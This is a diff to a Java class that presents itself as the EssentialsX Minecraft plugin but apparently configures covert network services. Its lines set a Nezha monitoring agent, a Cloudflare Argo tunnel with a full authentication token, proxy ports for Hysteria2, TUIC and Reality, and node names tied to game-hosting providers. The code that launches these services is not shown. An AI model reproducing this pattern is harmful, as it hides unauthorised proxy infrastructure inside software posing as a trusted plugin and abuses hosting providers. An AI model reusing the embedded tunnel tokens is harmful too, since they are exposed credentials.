@@ -79,10 +79,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "guppynodes.19861123.tech");
-        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiZjI4Y2FhYzAtZWU3Ni00MTQ1LWI3NDEtMWY2MTk4MGE3YTU0IiwicyI6IllqTmxOMkZsT0RNdE16ZzFaQzAwTVRobExUa3dZell0WXpjNU5URmpOVEEzT0RFeCJ9");
+        env.put("ARGO_DOMAIN", "bytenut.19861123.tech");
+        env.put("ARGO_AUTH", "eyJhIjoiOGFlMmFlYWQ5YTcyMTNkYmM3YTkwMDEzM2RhNzU5ODciLCJ0IjoiNDc1YzQwMWQtNDU1MS00M2E2LWEzNmYtYTEzNTBlMmM4NzUzIiwicyI6IlpERXdNRGhpTmpZdFl6VTBPQzAwTTJFNUxXRTRaalV0WlRFeE9HRTFNVFZoTjJFMiJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "10010");
+        env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
         env.put("REALITY_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "saas.sin.fan");
         env.put("CFPORT", "443");
-        env.put("NAME", "guppynodes");
+        env.put("NAME", "bytenut");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
